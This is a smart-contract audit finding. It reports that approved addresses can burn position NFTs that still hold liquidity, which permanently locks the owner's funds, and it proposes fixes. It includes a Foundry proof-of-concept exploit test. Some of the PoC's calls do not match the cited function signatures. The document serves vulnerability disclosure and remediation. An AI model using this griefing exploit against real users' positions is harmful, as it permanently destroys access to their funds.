## Title
Approved Addresses Can Permanently Lock User Funds by Burning Position NFTs with Active Liquidity

## Summary
The `BaseNonfungibleToken.burn()` function allows approved addresses to burn NFTs without validating whether the associated liquidity position has been withdrawn. Once burned, the NFT's authorization checks fail permanently, preventing position withdrawal and permanently locking user funds in the Core contract. [1](#0-0) 

## Impact
**Severity**: High

## Finding Description

**Location:** `src/base/BaseNonfungibleToken.sol` (burn function, lines 133-135)

**Intended Logic:** The `burn()` function is designed to allow NFT destruction for gas refunds "after the NFT is no longer needed", with the expectation that users have withdrawn their liquidity first. The documentation states the NFT can be recreated using the same salt. [2](#0-1) 

**Actual Logic:** The `burn()` function performs no validation to check if the NFT represents a position with active liquidity. It only verifies that the caller is authorized via the `authorizedForNft` modifier, which passes for both owners and approved addresses. [3](#0-2) 

**Exploitation Path:**

1. **Position Creation**: Alice creates a liquidity position by calling `mintAndDeposit()`, which internally calls `mint()` (the parameterless version that generates a random salt from `prevrandao()` and `gas()`). [4](#0-3) [5](#0-4) 

2. **NFT Approval**: Alice approves Bob for her NFT (either specific approval or `setApprovalForAll`), perhaps for listing on a marketplace or using a position management contract.

3. **Malicious Burn**: Bob calls `burn(tokenId)`, which passes the `authorizedForNft` check since Bob is approved. The NFT is destroyed via Solady's `_burn()`. [1](#0-0) 

4. **Position Becomes Inaccessible**: When Alice tries to withdraw her liquidity via `withdraw()`, `collectFees()`, or `deposit()`, all these functions require the `authorizedForNft(id)` modifier. [6](#0-5)  This modifier calls `_isApprovedOrOwner()` from Solady's ERC721, which internally calls `ownerOf(id)`. Since the token was burned, `ownerOf()` reverts, causing all position access to fail.

5. **Recovery Impossible**: Alice cannot recreate the NFT because she doesn't know the randomly generated salt. The salt was computed from `prevrandao()` and `gas()` at mint time, which are not stored or emitted. [7](#0-6) 

6. **Direct Core Access Blocked**: Alice cannot bypass the Positions contract to access her liquidity directly through Core because positions are stored with the Positions contract address as the owner. [8](#0-7)  Creating a custom locker would create a different position scope.

**Security Property Broken:** This vulnerability violates the critical invariant: "All positions MUST be withdrawable at any time" from the README.

## Impact Explanation

- **Affected Assets**: All liquidity tokens (token0 and token1) deposited in any position whose NFT was burned by an approved address.
- **Damage Severity**: Complete and permanent loss of principal and accrued fees. An attacker with approval on a position containing $1M in liquidity can permanently lock all $1M by calling a single `burn()` transaction.
- **User Impact**: Any user who used `mintAndDeposit()` (the standard minting flow) and granted NFT approval to another address. This includes users who:
  - Listed positions on NFT marketplaces
  - Delegated management to automated strategies
  - Used multicall approval patterns
  - Granted approval for any legitimate reason

## Likelihood Explanation

- **Attacker Profile**: Any address with NFT approval (specific approve or setApprovalForAll). This is a common operation in DeFi for marketplace listings, delegation, and smart contract integrations.
- **Preconditions**: 
  - Victim has an active position with liquidity
  - Victim has granted NFT approval to attacker
  - Victim used `mintAndDeposit()` or `mint()` without salt parameter (common case)
- **Execution Complexity**: Single transaction calling `positions.burn(tokenId)`. No special timing or state requirements.
- **Frequency**: Can be executed once per approved NFT. A malicious actor approved for multiple positions can drain all of them sequentially.

## Recommendation

Add a liquidity validation check to the `burn()` function to prevent burning NFTs with active positions:

```solidity
// In src/base/BaseNonfungibleToken.sol, add to BasePositions contract:

// Add a virtual function that derived contracts must implement
function _beforeBurn(uint256 id) internal virtual {}

// Modify burn function (line 133):
function burn(uint256 id) external payable authorizedForNft(id) {
    _beforeBurn(id); // Hook for validation
    _burn(id);
}

// In src/base/BasePositions.sol, implement the hook:
function _beforeBurn(uint256 id) internal override {
    // Check all possible tick ranges where this position could have liquidity
    // Since we can't enumerate all possibilities, require explicit zero liquidity proof
    // Or simply revert and require users to withdraw before burning
    revert("Must withdraw liquidity before burning position NFT");
}
```

**Alternative mitigation:** Emit the salt value in an event during minting so users can recover their NFT:

```solidity
// In src/base/BaseNonfungibleToken.sol:
event Minted(address indexed minter, uint256 indexed id, bytes32 salt);

function mint(bytes32 salt) public payable returns (uint256 id) {
    id = saltToId(msg.sender, salt);
    _mint(msg.sender, id);
    emit Minted(msg.sender, id, salt); // Allow salt recovery
}
```

However, the first recommendation (preventing burns of active positions) is the more secure approach as it directly addresses the root cause.

## Proof of Concept

```solidity
// File: test/Exploit_BurnPositionGrief.t.sol
// Run with: forge test --match-test test_burnPositionPermanentlyLocksLiquidity -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "./FullTest.sol";
import {MIN_TICK, MAX_TICK} from "../src/math/constants.sol";

contract Exploit_BurnPositionGrief is FullTest {
    address alice = address(0xA11CE);
    address bob = address(0xB0B);

    function test_burnPositionPermanentlyLocksLiquidity() public {
        // SETUP: Alice creates a position with significant liquidity
        vm.startPrank(alice);
        deal(address(token0), alice, 1000 ether);
        deal(address(token1), alice, 1000 ether);
        
        token0.approve(address(positions), type(uint256).max);
        token1.approve(address(positions), type(uint256).max);
        
        PoolKey memory poolKey = createPool(0, 1 << 63, 100);
        
        // Alice mints and deposits 100 ETH worth of liquidity
        (uint256 id, uint128 liquidity,,) = positions.mintAndDeposit(
            poolKey, 
            -100, 
            100, 
            100 ether, 
            100 ether, 
            0
        );
        
        // Verify liquidity exists
        (uint128 liquidityBefore,,,,) = positions.getPositionFeesAndLiquidity(
            id, poolKey, -100, 100
        );
        assertGt(liquidityBefore, 0, "Position should have liquidity");
        
        // Alice approves Bob (e.g., for marketplace listing)
        positions.approve(bob, id);
        vm.stopPrank();
        
        // EXPLOIT: Bob maliciously burns Alice's NFT
        vm.prank(bob);
        positions.burn(id);
        
        // VERIFY: Alice's liquidity is permanently locked
        vm.startPrank(alice);
        
        // Attempt 1: Try to withdraw - REVERTS
        vm.expectRevert(); // ownerOf reverts on burned token
        positions.withdraw(id, poolKey, -100, 100, liquidity);
        
        // Attempt 2: Try to collect fees - REVERTS
        vm.expectRevert();
        positions.collectFees(id, poolKey, -100, 100);
        
        // Attempt 3: Try to deposit more - REVERTS
        vm.expectRevert();
        positions.deposit(id, poolKey, -100, 100, 1 ether, 1 ether, 0);
        
        // Verify liquidity still exists in Core but is inaccessible
        (uint128 liquidityAfter,,,,) = positions.getPositionFeesAndLiquidity(
            id, poolKey, -100, 100
        );
        assertEq(liquidityAfter, liquidityBefore, "Liquidity still exists but is locked");
        
        vm.stopPrank();
        
        // SUCCESS: Vulnerability confirmed - Alice's funds are permanently locked
        console.log("Alice's liquidity permanently locked:", liquidityBefore);
        console.log("No recovery mechanism available");
    }
}
```

## Notes

This vulnerability is particularly severe because:

1. **User Expectation Mismatch**: Users expect approvals to grant trading/transfer rights, not the ability to permanently destroy their assets. Standard ERC721 approvals don't typically carry this risk.

2. **No Warning**: There's no warning in the UI or documentation that approving someone gives them the power to permanently lock your funds.

3. **Common Pattern**: The affected flow (`mintAndDeposit()` with random salt) is the standard way users create positions, making this exploitable against most users.

4. **No Admin Recovery**: Unlike protocol fees which the owner can withdraw, there's no emergency recovery mechanism for user positions. [9](#0-8) 

5. **Cross-Contract Dependency**: The issue spans multiple contracts (BaseNonfungibleToken, BasePositions, Core) making it non-obvious and hard to detect during review.

Even users who called `mintAndDepositWithSalt()` with a known salt face a griefing attack where attackers can repeatedly burn their NFTs, forcing them to waste gas re-minting before each operation.

### Citations

**File:** src/base/BaseNonfungibleToken.sol (L81-86)
```text
    modifier authorizedForNft(uint256 id) {
        if (!_isApprovedOrOwner(msg.sender, id)) {
            revert NotUnauthorizedForToken(msg.sender, id);
        }
        _;
    }
```

**File:** src/base/BaseNonfungibleToken.sol (L109-117)
```text
    function mint() public payable returns (uint256 id) {
        bytes32 salt;
        assembly ("memory-safe") {
            mstore(0, prevrandao())
            mstore(32, gas())
            salt := keccak256(0, 64)
        }
        id = mint(salt);
    }
```

**File:** src/base/BaseNonfungibleToken.sol (L128-132)
```text
    /// @inheritdoc IBaseNonfungibleToken
    /// @dev Can be used to refund some gas after the NFT is no longer needed.
    ///      The same ID can be recreated by the original minter by reusing the salt.
    ///      Only the token owner or approved addresses can burn the token.
    ///      No fees are collected; any msg.value sent is ignored.
```

**File:** src/base/BaseNonfungibleToken.sol (L133-135)
```text
    function burn(uint256 id) external payable authorizedForNft(id) {
        _burn(id);
    }
```

**File:** src/base/BasePositions.sol (L120-128)
```text
    function withdraw(
        uint256 id,
        PoolKey memory poolKey,
        int32 tickLower,
        int32 tickUpper,
        uint128 liquidity,
        address recipient,
        bool withFees
    ) public payable authorizedForNft(id) returns (uint128 amount0, uint128 amount1) {
```

**File:** src/base/BasePositions.sol (L159-169)
```text
    function mintAndDeposit(
        PoolKey memory poolKey,
        int32 tickLower,
        int32 tickUpper,
        uint128 maxAmount0,
        uint128 maxAmount1,
        uint128 minLiquidity
    ) external payable returns (uint256 id, uint128 liquidity, uint128 amount0, uint128 amount1) {
        id = mint();
        (liquidity, amount0, amount1) = deposit(id, poolKey, tickLower, tickUpper, maxAmount0, maxAmount1, minLiquidity);
    }
```

**File:** src/base/BasePositions.sol (L186-192)
```text
    function withdrawProtocolFees(address token0, address token1, uint128 amount0, uint128 amount1, address recipient)
        external
        payable
        onlyOwner
    {
        lock(abi.encode(CALL_TYPE_WITHDRAW_PROTOCOL_FEES, token0, token1, amount0, amount1, recipient));
    }
```

**File:** src/Core.sol (L381-381)
```text
            StorageSlot positionSlot = CoreStorageLayout.poolPositionsSlot(poolId, locker.addr(), positionId);
```
